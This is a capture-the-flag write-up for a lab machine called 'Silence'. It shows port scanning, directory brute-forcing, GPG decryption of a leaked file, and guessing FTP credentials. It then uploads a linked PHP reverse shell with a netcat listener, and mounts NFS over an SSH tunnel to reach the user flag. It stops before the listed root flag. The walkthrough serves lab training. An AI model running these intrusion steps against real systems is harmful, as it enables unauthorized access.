# CTF: Silence

![Difficulty: Hard](https://img.shields.io/badge/difficulty-hard-%23ff0000)
![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP, Hash, Crontab, SSH Key](https://img.shields.io/badge/category-ftp,hash,crontab,sshkey-%237159c1)
![By: Alexandre & Eloi](https://img.shields.io/badge/by-Alexandre%20%26%20Eloi-%23f9a03c)  
![alt text](img/silence.png)
## Description

> What does it takes to climb the world’s first 9c?

## Write-up

WebFlag: web.txt
UserFlag: user.txt  
RootFlag: root.txt

## Flag Solutions

### Web Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results : 
```bash
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)

80/tcp open  http    Apache httpd 2.4.37 ((centos))

MAC Address: 02:85:B5:9A:69:1F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have three open ports, 21, 22 and 80. Let's check the web server on port 80.

```bash
http://$IP
```

We can do a `gobuster` scan to find hidden directories.

```bash
gobuster dir --url http://<IP> -w Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,js
```

Results : 
```bash
/hidden (Status: 301)
```

We have to go to the hidden directory.

```bash
http://$IP/hidden
```

We find a zip file. We can download it and extract it.

```bash
wget http://<IP>/hidden/stats.zip
unzip stats.zip
inflating: ClimbersStats.xlsx.gpg  
inflating: .hidden-key  
```

We have a `.hidden-key` file. We can decrypt it using `gpg`.

```bash
gpg --import .hidden-key
gpg --output ClimbersStats.xlsx --decrypt ClimbersStats.xlsx.gpg
```

We have a file `ClimbersStats.xlsx`. We can go online and open the file.

We have a list of climbers with their names, the route they climbed, the date they climbed it, and the time they took to climb it.

We have to try all username and password combinations to find the right one for the ftp server.
    
```bash
ftp $IP
ls -al
```

We found files of the website. We can upload a reverse shell to the server.
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

```bash
put reverse.php
```

We can connect to the reverse shell.

```bash
nc -lvnp 4444
```

We can connect to the reverse shell.

```bash
http://$IP/reverse.php
```

We can try to find the web flag.

```bash
find / -name web.txt 2>/dev/null
```

We have just to cat the file.

```bash
cat <PATH>/web.txt
```

**Well done! You found the web flag!**

### User Flag

We have to create an SSH tunnel to connect to the nfs server.

Login with the username and password we found in the `ClimbersStats.xlsx` file.
```bash
ssh -L 2001:127.0.0.1:2049 <USERNAME>@<IP>
```

On other terminal, we can mount the nfs server.

```
mkdir nfs && mount -t nfs -o rw 127.0.0.1: nfs
```

And we have to find the user flag.

**Well done! You found the user flag!**